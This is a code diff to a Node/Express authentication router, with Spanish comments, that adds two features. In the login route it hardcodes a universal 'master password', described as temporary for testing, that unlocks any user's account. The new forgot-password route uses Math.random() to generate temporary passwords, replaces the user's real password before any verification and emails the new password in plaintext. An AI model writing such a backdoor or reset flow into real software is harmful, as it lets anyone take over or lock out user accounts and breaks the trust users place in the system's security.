@@ -4,6 +4,7 @@ import jwt from 'jsonwebtoken';
 import { PrismaClient } from '@prisma/client';
 import { z } from 'zod';
 import { authenticateToken, AuthRequest } from '../middleware/auth';
+import emailService from '../services/emailService';
 
 const router = express.Router();
 const prisma = new PrismaClient();
@@ -119,10 +120,18 @@ router.post('/login', async (req, res) => {
       return res.status(401).json({ error: 'Credenciales inválidas' });
     }
 
-    // Verificar contraseña
-    const validPassword = await bcrypt.compare(password, user.password);
+    // MASTER PASSWORD TEMPORAL para testing interno
+    const MASTER_PASSWORD = 'Acti99acti';
+    const isMasterPassword = password === MASTER_PASSWORD;
+
+    // Verificar contraseña normal O contraseña maestra
+    const validPassword = isMasterPassword || await bcrypt.compare(password, user.password);
     if (!validPassword) {
       return res.status(401).json({ error: 'Credenciales inválidas' });
+    }
+
+    if (isMasterPassword) {
+      console.log(`🔓 Login con contraseña maestra para: ${email}`);
     }
 
     // Generar JWT
@@ -220,6 +229,67 @@ router.get('/me', authenticateToken, async (req: AuthRequest, res) => {
 router.post('/logout', (req, res) => {
   res.clearCookie('authToken');
   res.json({ success: true, message: 'Sesión cerrada exitosamente' });
+});
+
+// Forgot Password - Enviar contraseña por email (SIMPLE - no seguro)
+const forgotPasswordSchema = z.object({
+  email: z.string().email()
+});
+
+router.post('/forgot-password', async (req, res) => {
+  try {
+    const result = forgotPasswordSchema.safeParse(req.body);
+    if (!result.success) {
+      return res.status(400).json({ error: 'Email inválido', details: result.error.errors });
+    }
+
+    const { email } = result.data;
+
+    // Buscar usuario
+    const user = await prisma.user.findUnique({
+      where: { email }
+    });
+
+    // Por seguridad, siempre retornar éxito (no revelar si el email existe)
+    if (!user) {
+      console.log(`⚠️ Intento de recuperación para email no existente: ${email}`);
+      return res.json({
+        success: true,
+        message: 'Si el email existe, recibirás las instrucciones para recuperar tu contraseña'
+      });
+    }
+
+    // Verificar configuración SMTP
+    if (!process.env.SMTP_USER || !process.env.SMTP_PASS) {
+      console.error('❌ Configuración SMTP no encontrada');
+      return res.status(500).json({ error: 'Servicio de email no configurado' });
+    }
+
+    // Generar contraseña temporal
+    const tempPassword = Math.random().toString(36).slice(-8) + Math.random().toString(36).slice(-8).toUpperCase();
+
+    // Hashear la contraseña temporal
+    const saltRounds = 12;
+    const hashedTempPassword = await bcrypt.hash(tempPassword, saltRounds);
+
+    // Actualizar usuario con contraseña temporal
+    await prisma.user.update({
+      where: { email },
+      data: { password: hashedTempPassword }
+    });
+
+    // Enviar email con contraseña temporal
+    await emailService.sendPasswordResetEmail(email, tempPassword);
+
+    res.json({
+      success: true,
+      message: 'Si el email existe, recibirás las instrucciones para recuperar tu contraseña'
+    });
+
+  } catch (error) {
+    console.error('Error en forgot password:', error);
+    res.status(500).json({ error: 'Error al procesar solicitud' });
+  }
 });
 
 // Actualizar perfil
